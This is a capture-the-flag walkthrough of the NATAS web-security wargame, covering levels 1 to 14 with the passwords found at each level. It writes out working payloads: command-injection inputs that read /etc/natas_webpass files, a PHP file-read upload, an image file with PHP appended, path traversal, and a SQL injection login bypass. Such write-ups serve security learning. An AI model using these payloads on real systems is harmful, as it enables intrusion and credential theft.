**OVER THE WIRE : NATAS Wargame**

[http://overthewire.org/wargames/natas/](http://overthewire.org/wargames/natas/)

**natas1**

By inspecting the webpage's html you can find the token as a comment

`&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;`

**natas2 **

Same as previous except rightclicking blocked. Using keyboard shortcuts, the html source can easily be opened.

`&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;`

**natas3 **

Nothing on the actual page. A pixel image was added and by looking at the parent directory `files` we can find a txt file with *username:password* in it and the 4th entry is:

`natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

**natas4 **

Page hint:

Using a simple google dork we can find the secret path:

`site:http://natas3.natas.labs.overthewire.org/`

returns `http://natas3.natas.labs.overthewire.org/s3cr3t/` with a .txt in there and an entry:

`natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

**natas5**

Page hint: *Access disallowed. You are visiting from "" while authorized users should come only from "[http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)"*

A simple curl request allows us to set the referrer and get the password: `curl -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/ -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

Returns : `Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

**natas5 **

Page hint: *Access disallowed. You are not logged in*

A cookie called loggedin has been set to 0 (false) changing it to 1 and reloading gives the password

`Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

**natas6 **

Opening the "source code" gives us a php page with `include "includes/secret.inc";`

Going to that file we see `$secret = "FOEIUWGHFEEUHOFUOIU";`

Using it as the secret on the first page, we get the password to the next stage:

`Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

**natas7**

By inspecting the page we see a useful comment and that the pages are requested using a parameter *[Home](index.php?page=home)*

We can then look at `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` which give us the password:

`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

**natas8 **

Similarly to natas 6 we have a source code to explore. We can see that the secret this time is encoded using a function

`bin2hex(strrev(base64_encode($secret)));`

we simply need to reverse the function to get the secret:

`bin2hex(strrev(base64_encode($secret)))`

by running `base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));`

we get the secret which is : `oubWYf2kBq`

Entering the secret gives us :

`Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

**natas9 **

The source code reveals `passthru("grep -i $key dictionary.txt");`

This code is vulnerable to code injection and we can then look for the file with the password.

From natas7, the passwords seems to reside under `/etc/natas_webpass`

Using `| ls -a /etc/natas_webpass #` we can list all the files in that directory and find *natas10*

Using `| cat /etc/natas_webpass/natas10 #` we get the password:

`nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

**natas10**

Similar to natas9 except there is a regex trying to match illegal characters.

The illegal characters are ";|&"

But grep is already powerful enough on it's own and by simply searching

`"" /etc/natas_webpass/natas11 #` we get:

`U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

**natas11 **

The hint here is "Cookies are protected with XOR encryption". Looking at the source, we find an xor_encrypt function with a `$key = '&lt;censored&gt;';` inside.

Since the key is used to XOR the output text, we can use the output and defaultdata to find the secret key.

With a script, we find that the key is `qw8J`

We then use this key to encrypt a new cookie with "showpassword=yes" as data and we get:

`The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

Here's the script I used: [https://pastebin.com/VdpS3AsF](https://pastebin.com/VdpS3AsF)

**natas12**

File upload problem. By looking at the html code we can see the form sets an hidden input as filename. In this case changing the ext to .php allows us to upload and run php files.

Uploading a php file with "&lt;?php readfile("/etc/natas_webpass/natas13"); ?&gt;" and setting the filename with a .php extension allows us to get the password:

`jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

**natas13**

Similar to natas12 except this time it's checking if the file is an image file `exif_imagetype($_FILES['uploadedfile']['tmp_name'])` This only check metadata and by creating a blank jpeg image and appending php code we can do the same thing as in natas12.

We're then able to run php code and get the password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

**natas14 **

Simple Sql injection.

Login using `" or 1=1 -- "` as password gives us the password:

`Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
